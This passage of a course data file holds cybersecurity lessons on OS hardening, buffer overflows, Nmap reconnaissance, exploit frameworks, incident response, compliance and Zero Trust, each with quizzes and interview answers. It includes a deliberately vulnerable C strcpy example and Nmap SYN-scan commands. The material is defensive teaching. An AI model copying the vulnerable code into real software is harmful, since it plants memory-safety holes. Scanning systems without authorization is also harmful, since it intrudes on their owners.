### Privilege Escalation & OS Hardening

Hardening is the process of securing an operating system by reducing its attack surface. Privilege escalation occurs when an attacker gains initial low-privilege access and exploits system flaws to gain administrative control.

#### Hardening Strategies:
*   **Remove Unnecessary Services:** Disable unused ports and services (e.g., shutting down unused FTP or Telnet services).
*   **Patch Management:** Keep OS and libraries updated to prevent exploit attempts.
*   **Configure Access Control Lists (ACLs):** Restrict system directory writes to admin users only.
*   **Enable Audit Logging:** Record system events (e.g., failed logins, changes to system files).

#### Privilege Escalation Vectors:
*   *Kernel Exploits:* Running exploit code targeting bugs in the OS kernel to get root access.
*   *Misconfigured Permissions:* Exploiting write permissions on system directories or cron scripts run by administrative accounts.

#### Quiz Questions:
1. **What is privilege escalation?**
   *   a) Upgrading database hardware
   *   b) Exploiting flaws to gain higher access levels (like root or administrator) than originally assigned (Correct)
   *   c) Encrypting network packets
2. **Which action is part of operating system hardening?**
   *   a) Opening firewall ports
   *   b) Disabling unused ports, patching, and restricting user access permissions (Correct)
   *   c) Sharing passwords

#### Interview Questions:
* **Explain the concept of Least Privilege in system security.**
  *   *Answer:* The principle of least privilege states that users and programs should be granted only the minimum permissions necessary to complete their specific tasks, reducing the impact of potential compromises.
* **How would you audit a Linux system for privilege escalation vulnerabilities?**
  *   *Answer:* Search for files with SUID permissions (which run with the file owner's privileges), inspect cron jobs running as root for writable scripts, and check for outdated kernel versions vulnerable to privilege escalation exploits.

#### Summary:
Hardening reduces the attack surface by configuring systems securely. Privilege escalation exploits system flaws to gain root access, requiring patch management and auditing to prevent.
            `,
            exercise: "List the running services on your machine and determine which ones are unnecessary and can be disabled to harden the system."
          },
          {
            id: "cy-l-3-5",
            title: "Buffer Overflow Vulnerabilities",
            time: "55 min",
            summary: "Memory stack layouts, unsafe functions in C/C++, overwrite checks, and memory protection mechanisms.",
            content: `
### Buffer Overflow Vulnerabilities

Buffer overflow is a memory safety vulnerability that occurs when an application writes more data to a buffer (a temporary storage area in memory) than it can hold, overwriting adjacent memory space.

#### Memory Stack Layout:
In C and C++, the call stack stores local variables, function parameters, and the **Return Address** (the pointer indicating where the CPU should resume executing code after the function finishes).
*   If an application accepts input without checking bounds, an attacker can input data larger than the allocated buffer.
*   The data overflows the buffer, overwriting the Return Address with a pointer pointing to malicious payload code injected by the attacker.

#### Vulnerable C Code Example:
\`\`\`c
#include <stdio.h>
#include <string.h>

void vulnerable_function(char *str) {
    char buffer[8];
    // strcpy does not check input bounds!
    strcpy(buffer, str); 
}

int main() {
    // Inputting more than 8 characters causes a buffer overflow:
    vulnerable_function("This string is way too long for the buffer!");
    return 0;
}
\`\`\`

#### Secured Code (Bounds Checked):
\`\`\`c
void secure_function(char *str) {
    char buffer[8];
    // strncpy checks bounds, preventing overflow:
    strncpy(buffer, str, sizeof(buffer) - 1);
    buffer[7] = '\\0'; // Ensure null termination
}
\`\`\`

#### Mitigations:
1.  **Use Safe Functions:** Replace \`strcpy\`, \`gets\` with \`strncpy\`, \`fgets\`.
2.  **ASLR (Address Space Layout Randomization):** Randomizes memory addresses at startup, making it difficult for attackers to predict return address targets.
3.  **DEP (Data Execution Prevention / W^X):** Marks the stack as non-executable, preventing injected payload scripts from running.

#### Quiz Questions:
1. **Which unsafe C function does not check input bounds, making it vulnerable to buffer overflows?**
   *   a) strncpy
   *   b) strcpy (Correct)
   *   c) printf
2. **How does Data Execution Prevention (DEP) prevent buffer overflow exploits?**
   *   a) By encrypting input strings
   *   b) By marking stack memory areas as non-executable, blocking payload code execution (Correct)
   *   c) By changing the host IP address

#### Interview Questions:
* **How does an attacker exploit a stack-based buffer overflow?**
  *   *Answer:* The attacker inputs a payload containing malicious shellcode followed by address pointers. The input overflows the stack buffer, overwriting the function's return address. When the function returns, the CPU jumps to the address specified by the attacker, executing the malicious shellcode.
* **What is a Stack Canary?**
  *   *Answer:* A stack canary is a random value placed between the buffer and the return address on the stack. Before returning, the function checks if the canary value has changed. If it has (indicating a buffer overflow occurred), the program terminates immediately to prevent exploit execution.

#### Summary:
Buffer overflows overwrite adjacent memory slots due to lack of bounds checking. They are prevented using safe functions (like strncpy) and memory protections like ASLR and DEP.
            `,
            exercise: "Analyze the vulnerable C code above and write a modified version using strncpy to secure it."
          }
        ]
      },
      {
        id: "cy-m-4",
        title: "Module 4: Incident Response, Pentesting & Governance",
        duration: "1 Week",
        difficulty: "Advanced",
        objectives: [
          "Execute port scanning reconnaissance using Nmap",
          "Differentiate Nessus scans and Metasploit exploits",
          "Identify attack footprints in SIEM event logs",
          "Synthesize Zero Trust policies and least privilege rules"
        ],
        lessons: [
          {
            id: "cy-l-4-1",
            title: "Penetration Testing Methodologies & Reconnaissance",
            time: "50 min",
            summary: "Ethical hacking phases, active vs passive recon, and Nmap port scanning commands.",
            content: `
### Penetration Testing Methodologies & Reconnaissance

Penetration testing (ethical hacking) is the practice of testing a system to identify vulnerabilities. It follows structured phases.

#### Phases of Ethical Hacking:
1.  **Reconnaissance (Information Gathering):**
    *   *Passive:* Gathering data without directly interacting with targets (e.g., WHOIS searches, OSINT).
    *   *Active:* Directly interacting with target systems (e.g., port scanning).
2.  **Scanning & Analysis:** Identifying active hosts, operating systems, and open ports.
3.  **Gaining Access (Exploitation):** Exploiting vulnerabilities to gain access.
4.  **Maintaining Access:** Installing backdoors or persistence.
5.  **Reporting:** Documenting findings and remediation recommendations.

#### Nmap CLI Port Scanning Examples:
\`\`\`bash
# 1. SYN Scan (Stealthy, does not complete TCP handshake):
nmap -sS 192.168.1.100

# 2. Service Version Detection (-sV) and OS Detection (-O):
nmap -sV -O 192.168.1.100

# 3. Fast scan (-F) targeting top 100 ports:
nmap -F 192.168.1.100
\`\`\`

#### Quiz Questions:
1. **Which phase of penetration testing involves gathering information about the target using public databases?**
   *   a) Exploitation
   *   b) Passive Reconnaissance (Correct)
   *   c) Reporting
2. **What does an Nmap SYN Scan (-sS) do?**
   *   a) Completes the TCP three-way handshake
   *   b) Sends SYN packets and waits for replies without completing the TCP handshake to remain stealthy (Correct)
   *   c) Deletes log files

#### Interview Questions:
* **What is the difference between active and passive reconnaissance?**
  *   *Answer:* Passive reconnaissance gathers information without touching the target's servers directly (e.g., reading Shodan listings or DNS records). Active reconnaissance directly queries the target's systems (e.g., running Nmap port scans), which can trigger intrusion detection alarms.
* **Describe what a 'Filtered' port status means in an Nmap scan output.**
  *   *Answer:* A 'Filtered' port status means that Nmap cannot determine if the port is open or closed because a firewall or network filter is blocking the probe packets from reaching the port or preventing return traffic.

#### Summary:
Ethical hacking follows phases from recon to reporting. Nmap is an active scanning tool used to map open ports, operating systems, and service versions.
            `,
            exercise: "Run a stealthy Nmap SYN scan on a local test IP address (or using sandbox simulations) and document the open ports discovered."
          },
          {
            id: "cy-l-4-2",
            title: "Vulnerability Scanning & Exploit Frameworks",
            time: "50 min",
            summary: "Automation scans with Nessus, exploiting systems with Metasploit, and CVSS severity scoring.",
            content: `
### Vulnerability Scanning & Exploit Frameworks

Security teams use automated scanners to identify vulnerabilities, and exploit frameworks to test if those vulnerabilities can be exploited.

#### 1. Vulnerability Scanners (Nessus, OpenVAS):
Automated software that scans networks and systems, matching version banners against databases of known vulnerabilities (CVEs).
*   **Vulnerability Severity:** Classified using the **Common Vulnerability Scoring System (CVSS)**, scored from 0.0 (None) to 10.0 (Critical).

#### 2. Exploit Frameworks (Metasploit):
A modular platform containing a database of pre-written exploit payloads.
*   *Exploit:* The code that leverages a vulnerability to bypass security.
*   *Payload:* The code that runs on the target after exploitation (e.g., establishing a shell connection).
*   *Meterpreter:* An advanced Metasploit payload providing interactive system access.

#### Quiz Questions:
1. **Which system is used to grade vulnerability severity on a scale from 0.0 to 10.0?**
   *   a) TCP/IP Model
   *   b) Common Vulnerability Scoring System (CVSS) (Correct)
   *   c) OWASP Top 10
2. **What is a payload in Metasploit?**
   *   a) The vulnerability exploit script
   *   b) The malicious code executed on the target system after a vulnerability is successfully exploited (Correct)
   *   c) A backup log file

#### Interview Questions:
* **How do you handle false positives returned by automated vulnerability scanners?**
  *   *Answer:* Validate the findings manually (e.g., verifying if the vulnerable service is actually running or shielded by firewalls) and document the validation. If it is a false positive, mark it in the scanner to prevent duplicate alerts.
* **Explain the difference between a vulnerability exploit and a payload.**
  *   *Answer:* An exploit is the code that leverages a software bug to bypass access controls. A payload is the actual command code (e.g., establishing a remote shell) that runs after the exploit opens the security gate.

#### Summary:
Nessus automates vulnerability scanning, grading severity using CVSS scores. Metasploit uses exploits to bypass security and payloads to manage target servers.
            `,
            exercise: "Research a CVE vulnerability with a CVSS score of 9.8 or 10.0 and document the exploit mechanics."
          },
          {
            id: "cy-l-4-3",
            title: "Incident Response & Threat Hunting",
            time: "55 min",
            summary: "SANS incident handling phases, SIEM log analysis, containment, and threat indicators (IoCs).",
            content: `
### Incident Response & Threat Hunting

Incident Response (IR) is the structured process of managing the aftermath of a security breach. Threat Hunting is the proactive search for undetected threats inside a network.

#### SANS Incident Handling Phases:
1.  **Preparation:** Hardening systems and training the incident response team before an attack occurs.
2.  **Identification:** Detecting anomalous behavior and determining if it represents a security incident.
3.  **Containment:** Isolating infected systems to prevent the attack from spreading (e.g., disconnecting a server from the network).
4.  **Eradication:** Removing malware, backdoor links, and vulnerabilities from the system.
5.  **Recovery:** Restoring services from clean backups and returning to normal operations.
6.  **Lessons Learned:** Documenting the incident to improve future defenses.

#### SIEM (Security Information & Event Management):
SIEM systems aggregate and correlate log events from firewalls, servers, and routers to identify threat patterns.
*   *Indicators of Compromise (IoCs):* Forensic clues pointing to infections (e.g., matching known malware IP addresses or file hashes in system logs).

#### Quiz Questions:
1. **During which SANS incident response phase do you disconnect a compromised server from the network to stop malware from spreading?**
   *   a) Identification
   *   b) Containment (Correct)
   *   c) Recovery
2. **What is a SIEM system used for?**
   *   a) Encrypting client databases
   *   b) Aggregating and correlating security log events from across the network (Correct)
   *   c) Running port scans

#### Interview Questions:
* **If you identify a compromised server, why should you avoid rebooting it immediately?**
  *   *Answer:* Rebooting clears volatile memory (RAM). RAM contains critical forensic evidence, such as running malware processes, active connections, and encryption keys. You should dump the memory first to preserve evidence.
* **What are Indicators of Compromise (IoCs)? Give examples.**
  *   *Answer:* IoCs are digital evidence indicating a system compromise. Examples include unusual outbound network connections to suspicious IP addresses, unknown system file modifications, registry changes, or matches with known malware hashes.

#### Summary:
Incident response handles breaches using SANS phases. Containment stops the spread, and SIEM tools analyze log events to identify indicators of compromise (IoCs).
            `,
            exercise: "Analyze a mock firewall log snippet and highlight connections that point to an unauthorized database data transfer."
          },
          {
            id: "cy-l-4-4",
            title: "Security Governance & Compliance Frameworks",
            time: "45 min",
            summary: "GDPR, HIPAA, PCI-DSS compliance audits, and security policy controls.",
            content: `
### Security Governance & Compliance Frameworks

Compliance frameworks help organizations implement consistent security controls and meet regulatory guidelines.

#### Key Frameworks & Regulations:
*   **GDPR (General Data Protection Regulation):** EU regulation protecting personal user data privacy. Violations result in massive financial penalties.
*   **HIPAA (Health Insurance Portability and Accountability):** US law enforcing data security for patient health records (PHI).
*   **PCI-DSS (Payment Card Industry Data Security Standard):** Requirements for organizations that handle credit card payments.
*   **SOC 2 (System and Organization Controls):** Audit reports assessing a service provider's controls regarding security, availability, and confidentiality.

#### Administrative, Technical & Physical Controls:
*   *Technical:* Firewalls, encryption, antivirus software.
*   *Administrative:* Policies, employee training, background checks.
*   *Physical:* Locked server racks, security badges, biometric gates.

#### Quiz Questions:
1. **Which regulation enforces security compliance for credit card transactions and data?**
   *   a) HIPAA
   *   b) PCI-DSS (Correct)
   *   c) GDPR
2. **Locked server racks and biometric access gates are examples of which control category?**
   *   a) Administrative
   *   b) Technical
   *   c) Physical (Correct)

#### Interview Questions:
* **How does compliance differ from security?**
  *   *Answer:* Compliance means meeting the requirements of a specific regulation or standard (checking checkboxes). Security is the actual practice of protecting assets from threats. A compliant system is not necessarily secure, but a secure system should easily meet compliance guidelines.
* **What is the goal of a SOC 2 audit report?**
  *   *Answer:* A SOC 2 report provides independent validation that a service provider has designed and implemented effective security controls to protect client data, which is critical for B2B cloud agreements.

#### Summary:
Compliance regulations (GDPR, HIPAA, PCI-DSS) enforce security baselines. Organizations implement administrative, technical, and physical controls to meet audits.
            `,
            exercise: "Outline the key security controls an online store must implement to comply with the PCI-DSS standard."
          },
          {
            id: "cy-l-4-5",
            title: "Zero Trust Architecture",
            time: "45 min",
            summary: "The Zero Trust model, identity verification, micro-segmentation, and Continuous Verification principles.",
            content: `
### Zero Trust Architecture

Traditional network security relies on the **Castle-and-Moat** model: protect the network perimeter (moat), but trust everyone inside the network (castle). Zero Trust replaces this model by assuming threats exist inside the network at all times.

#### Core Principles of Zero Trust:
1.  **Never Trust, Always Verify:** Every access request must be authenticated, authorized, and encrypted, regardless of whether it originates inside or outside the network.
2.  **Least Privilege Access:** Restrict user and machine permissions to the minimum necessary to complete the task.
3.  **Assume Breach:** Segment networks to limit the blast radius of a potential compromise (micro-segmentation) and constantly audit system logs.

#### Zero Trust vs Castle-and-Moat:
\`\`\`
Castle-and-Moat:
[User (Trusted)] ===> [Internal Subnet (No Firewalls)] ===> Access Database
(Perimeter Firewall blocks external users, but internal users have wide access)

Zero Trust:
[User] ===> MFA Check ===> Device Compliance Check ===> Policy Auth Check ===> Access Database
(Verification occurs on every single access query, internal or external)
\`\`\`

#### Quiz Questions:
1. **What is a core principle of Zero Trust Architecture?**
   *   a) Trusting all internal users automatically
   *   b) Never trust, always verify (Correct)
   *   c) Disabling user firewalls
2. **What does micro-segmentation accomplish?**
   *   a) Speeding up database writes
   *   b) Dividing networks into small, isolated security zones to contain breaches (Correct)
   *   c) Deleting user accounts

#### Interview Questions:
* **Why is the castle-and-moat security model obsolete in modern cloud environments?**
  *   *Answer:* Because of remote work, mobile devices, SaaS applications, and cloud computing. There is no longer a defined network perimeter. An attacker who compromises a single VPN connection can move laterally across the network, making perimeter-only security ineffective.
* **How does continuous verification work in Zero Trust?**
  *   *Answer:* Access permissions are not checked only once at login. Instead, the security system continuously validates user identity, device health compliance (e.g. checking if antivirus is active), and session context throughout the session.

#### Summary:
Zero Trust assumes threats exist inside the network. It requires continuous verification of users and devices, least privilege access, and micro-segmentation.
            `,
            exercise: "Write a security proposal explaining how to transition a company's internal network from a castle-and-moat VPN model to a Zero Trust architecture."
          }
        ]
      }
    ]
  }
];

export const resourcesList = [
  {
    category: "Security Reference Manuals",
    items: [
      { name: "OWASP Top 10 Core Project", desc: "Detailed breakdown of the most critical web vulnerabilities and remediations.", link: "https://owasp.org/www-project-top-ten" },
      { name: "PortSwigger Web Security Academy", desc: "Interactive labs and guides explaining web security vectors.", link: "https://portswigger.net/web-security" },
      { name: "SANS Incident Handler's Handbook", desc: "SANS guidelines on managing and analyzing security incidents.", link: "https://www.sans.org/white-papers/33919" }
    ]
  }
];

export const glossary = [
  { term: "CIA Triad", def: "Confidentiality, Integrity, and Availability - the three core pillars of system security." },
  { term: "Symmetric Encryption", def: "Encryption standard using the same key for both encryption and decryption." },
  { term: "Digital Signature", def: "A cryptographic signature verifying transaction authenticity and data integrity." },
  { term: "SQL Injection", def: "Vulnerability where untrusted input concatenates directly into database queries." },
  { term: "XSS", def: "Cross-Site Scripting - client-side script injection executing malicious JavaScript inside user browsers." },
  { term: "CSRF", def: "Cross-Site Request Forgery - forcing authenticated browsers to submit unauthorized actions." },
  { term: "Bcrypt", def: "A slow, password-hashing algorithm utilizing salt and adjustable cost metrics." },
  { term: "Buffer Overflow", def: "Vulnerability writing data beyond buffer boundaries to overwrite execution addresses." },
  { term: "Nmap", def: "Network Mapper - a port scanning utility used for active host and port reconnaissance." },
  { term: "Zero Trust", def: "Security framework assuming threats exist everywhere, requiring continuous verification on every request." }
];
